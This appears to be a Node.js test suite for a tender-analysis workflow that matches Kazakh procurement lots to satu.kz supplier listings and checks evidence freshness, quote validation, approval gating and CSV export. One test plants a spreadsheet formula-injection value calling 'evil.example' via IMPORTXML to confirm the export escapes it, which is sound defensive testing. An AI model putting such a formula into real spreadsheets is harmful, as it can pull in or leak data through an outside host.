const test=require('node:test'),assert=require('node:assert/strict'),vm=require('node:vm'),fs=require('node:fs');
function harness(){
 const calls=[];
 const ctx=vm.createContext({Date,Map,Set,
 productCardHost_:u=>typeof u==='string'&&/^https:\/\/www\.satu\.kz\//.test(u)?'www.satu.kz':null,
 productCardAllowed_:c=>c.url==='https://www.satu.kz/p1',tenderSupplierSearchTerm_:v=>v,
 tenderSupplierSearchDomain_:()=> 'satu.kz',
 analyzeTenderSameDay:(s,inputs,p,at)=>{calls.push('research');return {issue:null,items:s.items.map(i=>{
 const o=inputs.find(x=>x.lot.id===i.lotId);
 return o?o.result:{lotId:i.lotId,decision:'REVIEW',nationalDecision:'HOLD_NATIONAL',reason:'EXACT_RESEARCH_INPUT_REQUIRED'};
 })};}});
 vm.runInContext(fs.readFileSync('TenderWorkflow.gs','utf8'),ctx);return {ctx,calls};
}
const now='2026-10-13T05:00:00.000Z';
function shortlist(){return {mode:'SAME_DAY_SELECTED_IDS_READ_ONLY',coverage:'sample_only',
 observedAt:now,date:'2026-10-13',items:[{lotId:'1',decision:'SAME_DAY_CANDIDATE',lotNumber:'1-ЗЦП1',
 announcementNumber:'2-1',quantity:2,amountKzt:10000,sourceUrl:'https://old.goszakup.gov.kz/ru/subpriceoffer/index/2/1',
 deadline:'2026-10-13T08:00:00.000Z',applicationStart:'2026-10-13T04:00:00.000Z'}]};}
const pol={shortlistMaxAgeMs:300000};
function searchPlan(){return {mode:'SUPPLIER_SEARCH_PLAN',issue:null,queries:[{lotId:'1',provider:'SATU',origin:'KZ',domain:'satu.kz',
 expected:{brand:'CNP',model:'CDLF',partNumber:'P1'}}]};}
function search(){return {mode:'SUPPLIER_SEARCH_URL_PREVIEW',coverage:'selected_domains_only',issue:null,observedAt:now,
 queriesAttempted:1,items:[{lotId:'1',provider:'SATU',origin:'KZ',productUrl:'https://www.satu.kz/p1',
 sourceType:'SEARCH_RESULT_LINK',verification:'PENDING_PRODUCT_CARD'}]};}
test('search URL -> exact-card follow-up without invented price or stock',()=>{
 const {ctx}=harness();const r=ctx.planTenderProductCardFollowup(shortlist(),searchPlan(),search(),{},now);
 assert.equal(r.issue,null);assert.equal(r.requests.length,1);assert.equal(r.requests[0].expected.partNumber,'P1');
 assert.equal(r.verifiedQuotes,0);assert.equal(r.nationalDecision,'HOLD_NATIONAL');
});
test('URL outside search scope cannot become a card request',()=>{
 const {ctx}=harness(),s=search();s.items[0].productUrl='https://www.satu.kz/outside';
 const r=ctx.planTenderProductCardFollowup(shortlist(),searchPlan(),s,{},now);
 assert.equal(r.requests.length,0);assert.equal(r.rejected.length,1);
});
test('stale and expired evidence cannot flow into workflow',()=>{
 const {ctx}=harness(),s=shortlist();s.observedAt='2026-10-12T05:00:00.000Z';
 assert.equal(ctx.compileTenderWorkflow(s,[],pol,null,null,now).issue,'WORKFLOW_CURRENT_INPUT_REQUIRED');
 const t=shortlist();t.items[0].deadline=now;
 assert.equal(ctx.planTenderProductCardFollowup(t,searchPlan(),search(),{},now).issue,'SEARCH_LOT_EXPIRED');
});
test('unknown national remains HOLD and no profits are synthesized from search',()=>{
 const {ctx,calls}=harness();
 const r=ctx.compileTenderWorkflow(shortlist(),[],pol,search(),null,now);
 assert.equal(r.issue,null);assert.deepEqual(calls,['research']);
 assert.equal(r.rows[0].nationalDecision,'HOLD_NATIONAL');
 assert.equal(r.rows[0].decision,'REVIEW');assert.equal(r.rows[0].profitKzt,null);
 assert.equal(r.rows[0].sourceLink,null);assert.equal(r.rows[0].foundSearchLinks,1);
});
test('JSON-LD observed prices stay unreviewed, not profit or quote source',()=>{
 const {ctx}=harness(),cards={mode:'PRODUCT_CARD_PROBE_READ_ONLY',observedAt:now,issue:null,
 items:[{lotId:'1',productUrl:'https://www.satu.kz/p1',status:'UNREVIEWED_PRODUCT_CARD',
 identityMatch:'EXACT_FIELDS',listedOffer:{unitPrice:2000,currency:'KZT'}}]};
 const r=ctx.compileTenderWorkflow(shortlist(),[],pol,search(),cards,now);
 assert.equal(r.rows[0].unitPriceKzt,null);assert.equal(r.rows[0].sourceLink,null);
 assert.equal(r.rows[0].observedUnitPrices[0].verification,'UNREVIEWED');
 assert.equal(r.rows[0].unreviewedCardObservations,1);
});
test('reviewed GO must bind to actual validated selected quote',()=>{
 const {ctx}=harness(),result={decision:'GO',nationalDecision:'PASS_TO_TS',compliance:'TS_COMPLIANCE_100_PERCENT',
 finance:{quoteId:'Q1',partyPurchaseCost:3000,totalLandedCost:4000,netProfit:6000,netMarginPercent:60},
 validQuoteIds:['Q1'],originalTs:{url:'https://old.goszakup.gov.kz/original.pdf',sha256:'a'.repeat(64)}};
 const inp=[{lot:{id:'1'},quotes:[{id:'Q1',supplierId:'SUP-1',brand:'CNP',model:'CDLF',partNumber:'P1',
 priceEvidence:{url:'https://www.satu.kz/p1'}}],result}];
 const r=ctx.compileTenderWorkflow(shortlist(),inp,pol,null,null,now);
 assert.equal(r.rows[0].decision,'GO');assert.equal(r.rows[0].confidence,'HIGH');
 assert.equal(r.rows[0].unitPriceKzt,1500);assert.equal(r.rows[0].tsCompliancePercent,100);
 assert.equal(r.rows[0].sourceLink,'https://www.satu.kz/p1');
 delete inp[0].quotes[0].id;
 const blocked=ctx.compileTenderWorkflow(shortlist(),inp,pol,null,null,now);
 assert.equal(blocked.rows[0].decision,'REVIEW');
});
test('formula-safe CSV with full tender analysis columns and no storage',()=>{
 const {ctx}=harness(),r=ctx.compileTenderWorkflow(shortlist(),[],pol,null,null,now);
 r.rows[0].productName='=IMPORTXML("https://evil.example", "x")';
 const csv=ctx.exportTenderWorkflowCsv(r);
 assert.match(csv,/tsCompliancePercent/);assert.match(csv,/profitPercent/);
 assert.match(csv,/"'=IMPORTXML\(""https:\/\/evil\.example"", ""x""\)"/);
 assert.equal(ctx.exportTenderWorkflowCsv({issue:'BLOCK'}),null);
});
test('unapproved official runtime cannot query source or write Sheets',()=>{
 const {ctx}=harness();let n=0;ctx.inspectTenderClosingDayDiscovery=()=>{n++;return null;};
 const r=ctx.inspectTenderIntegratedOnce([],{approved:false});
 assert.equal(r.issue,'WORKFLOW_OWNER_APPROVAL_REQUIRED');assert.equal(n,0);
});
test('pure functions do not mutate raw observations',()=>{
 const {ctx}=harness(),s=shortlist(),q=search(),before=JSON.stringify([s,q]);
 ctx.compileTenderWorkflow(s,[],pol,q,null,now);
 assert.equal(JSON.stringify([s,q]),before);
});
